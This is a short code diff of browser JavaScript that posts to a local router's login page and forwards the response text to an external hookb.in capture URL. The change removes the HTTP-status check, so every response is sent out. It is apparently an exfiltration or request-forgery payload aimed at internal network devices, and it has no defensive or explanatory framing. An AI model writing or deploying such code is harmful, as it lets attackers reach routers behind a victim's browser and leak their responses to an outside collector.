@@ -8,12 +8,12 @@ http.open('POST', 'http://router.local/login.php', true);
 // });
 http.onload = function () {
     if (http.readyState === http.DONE) {
-        if (http.status === 200) {
+        
             const xhr = new XMLHttpRequest();
             xhr.open('POST', 'https://hookb.in/9XowRPn7byCW1OXXwdWQ', true);
             xhr.setRequestHeader('Content-type', 'application/json');
             xhr.send(JSON.stringify(http.responseText));
-        }
+        
     }
 };
 //http.open('GET', 'http://router.local/login.php/');
